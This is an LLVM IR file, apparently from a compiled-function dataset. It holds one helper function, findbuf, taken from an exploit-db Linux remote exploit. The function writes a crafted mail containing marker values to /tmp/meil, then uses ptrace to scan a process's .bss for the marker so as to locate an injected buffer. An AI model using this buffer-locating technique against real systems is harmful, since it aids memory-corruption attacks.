; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_99.c_findbuf.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_99.c_findbuf.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.bss = type { i32, i32 }
%struct.user_regs_struct = type { i32 }

@.str = private unnamed_addr constant [31 x i8] c".bss START =0x%.8x END=0x%.8x\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"from\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"subj\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"to\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"/tmp/meil\00", align 1
@PTRACE_GETREGS = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [17 x i8] c"Checking 0x%.8x\0D\00", align 1
@stdout = common dso_local global i32 0, align 4
@PTRACE_PEEKTEXT = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [9 x i8] c"ptrace()\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @findbuf(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.bss, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.user_regs_struct, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.bss, align 4
  store i32 %0, i32* %3, align 4
  store i32 305419896, i32* %6, align 4
  store i32 -1, i32* %8, align 4
  %12 = call i64 (...) @getbss()
  %13 = bitcast %struct.bss* %11 to i64*
  store i64 %12, i64* %13, align 4
  %14 = bitcast %struct.bss* %4 to i8*
  %15 = bitcast %struct.bss* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %14, i8* align 4 %15, i64 8, i1 false)
  %16 = getelementptr inbounds %struct.bss, %struct.bss* %4, i32 0, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = getelementptr inbounds %struct.bss, %struct.bss* %4, i32 0, i32 1
  %19 = load i32, i32* %18, align 4
  %20 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0), i32 %17, i32 %19)
  %21 = call i32 @prepare_mail(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  %22 = getelementptr inbounds %struct.bss, %struct.bss* %4, i32 0, i32 0
  %23 = load i32, i32* %22, align 4
  %24 = getelementptr inbounds %struct.bss, %struct.bss* %4, i32 0, i32 0
  %25 = load i32, i32* %24, align 4
  %26 = load i32, i32* %3, align 4
  %27 = bitcast i32* %6 to i8*
  %28 = call i32 @own_hard(i32 1094795585, i32 %23, i32 %25, i32 %26, i8* %27)
  %29 = call i32 @write_mail(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %30 = getelementptr inbounds %struct.bss, %struct.bss* %4, i32 0, i32 0
  %31 = load i32, i32* %30, align 4
  store i32 %31, i32* %7, align 4
  %32 = call i32 @start_debug(i32 1)
  store i32 %32, i32* %5, align 4
  %33 = load i32, i32* @PTRACE_GETREGS, align 4
  %34 = load i32, i32* %5, align 4
  %35 = call i32 @ptrace(i32 %33, i32 %34, i32 0, %struct.user_regs_struct* %9)
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %38

37:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %82

38:                                               ; preds = %1
  %39 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %9, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  %41 = icmp ne i32 %40, 1094795585
  br i1 %41, label %42, label %43

42:                                               ; preds = %38
  store i32 -1, i32* %2, align 4
  br label %82

43:                                               ; preds = %38
  %44 = getelementptr inbounds %struct.bss, %struct.bss* %4, i32 0, i32 0
  %45 = load i32, i32* %44, align 4
  store i32 %45, i32* %7, align 4
  br label %46

46:                                               ; preds = %74, %43
  %47 = load i32, i32* %7, align 4
  %48 = getelementptr inbounds %struct.bss, %struct.bss* %4, i32 0, i32 1
  %49 = load i32, i32* %48, align 4
  %50 = icmp slt i32 %47, %49
  br i1 %50, label %51, label %77

51:                                               ; preds = %46
  %52 = load i32, i32* %7, align 4
  %53 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i32 %52)
  %54 = load i32, i32* @stdout, align 4
  %55 = call i32 @fflush(i32 %54)
  %56 = load i32, i32* @PTRACE_PEEKTEXT, align 4
  %57 = load i32, i32* %5, align 4
  %58 = load i32, i32* %7, align 4
  %59 = call i32 @ptrace(i32 %56, i32 %57, i32 %58, %struct.user_regs_struct* null)
  store i32 %59, i32* %10, align 4
  %60 = load i32, i32* %10, align 4
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %62, label %67

62:                                               ; preds = %51
  %63 = load i64, i64* @errno, align 8
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %67

65:                                               ; preds = %62
  %66 = call i32 @die(i32 1, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  br label %67

67:                                               ; preds = %65, %62, %51
  %68 = load i32, i32* %10, align 4
  %69 = load i32, i32* %6, align 4
  %70 = icmp eq i32 %68, %69
  br i1 %70, label %71, label %73

71:                                               ; preds = %67
  %72 = load i32, i32* %7, align 4
  store i32 %72, i32* %8, align 4
  br label %77

73:                                               ; preds = %67
  br label %74

74:                                               ; preds = %73
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %46

77:                                               ; preds = %71, %46
  %78 = load i32, i32* %5, align 4
  %79 = call i32 @stop_debug(i32 %78)
  %80 = call i32 @putchar(i8 signext 10)
  %81 = load i32, i32* %8, align 4
  store i32 %81, i32* %2, align 4
  br label %82

82:                                               ; preds = %77, %42, %37
  %83 = load i32, i32* %2, align 4
  ret i32 %83
}

declare dso_local i64 @getbss(...) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @printf(i8*, i32, ...) #1

declare dso_local i32 @prepare_mail(i8*, i8*, i8*) #1

declare dso_local i32 @own_hard(i32, i32, i32, i32, i8*) #1

declare dso_local i32 @write_mail(i8*) #1

declare dso_local i32 @start_debug(i32) #1

declare dso_local i32 @ptrace(i32, i32, i32, %struct.user_regs_struct*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @die(i32, i8*) #1

declare dso_local i32 @stop_debug(i32) #1

declare dso_local i32 @putchar(i8 signext) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
